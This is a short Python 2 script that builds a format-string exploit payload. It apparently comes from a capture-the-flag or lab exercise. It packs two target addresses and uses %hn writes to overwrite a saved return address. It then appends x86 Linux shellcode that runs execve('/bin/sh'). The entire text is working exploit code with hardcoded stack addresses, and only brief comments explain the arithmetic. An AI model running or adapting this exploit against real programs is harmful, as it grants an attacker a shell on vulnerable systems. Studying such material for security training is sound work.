from struct import pack

shellcode = ("\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80")

#return addr = $ebp+4 = 0xbffeae4c
addr1 = pack("<I", 0xbffeae4c)
addr2 = pack("<I", 0xbffeae4e)

padding = 'A'*3

#0xbffea640 = buffer containing shellcode : bffe -> 49150, a640 ->42560
#buffer addr containing shellcode = 0xbffea664: a664->42596, bffe->49150

print addr1+addr2+"%42588x%04$hn%6554x%05$hn"+padding+shellcode
